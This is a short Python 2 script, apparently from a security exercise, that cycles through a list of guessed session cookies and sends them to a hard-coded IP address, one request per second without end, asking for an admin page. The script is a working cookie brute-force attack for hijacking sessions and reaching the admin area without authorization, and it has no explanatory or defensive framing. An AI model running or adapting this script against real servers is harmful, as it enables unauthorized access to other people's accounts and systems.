#!/usr/bin/env python
import sys
import socket
from random import randint
from time import sleep
import cookies

POSSIBLE_COOKIES = cookies.getcookies()

def send_request(cookie): 
    kukki = 'user=' + cookie
    try: 
        goofus_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        goofus_socket.connect(('130.127.133.83', 80))
        hdr_start = 'GET /admin.html HTTP/1.1\r\nHost: 192.168.1.7\r\nCookie: '
        request = hdr_start + kukki + '\r\n\r\n'
        goofus_socket.send(request)
    except socket.error: 
        print 'Could not connect...'
    sleep(1)

def pick_cookie(start):
    return POSSIBLE_COOKIES[randint(start, start + 4)]

if __name__ == '__main__':

    if len (sys.argv) != 2:
        exit()   

    start = int(sys.argv[1])*5
    while True:
        current_cookie = pick_cookie(start)
        send_request(current_cookie)
        sleep(1)
    print 'Finishing due to keyboard interrupt.'

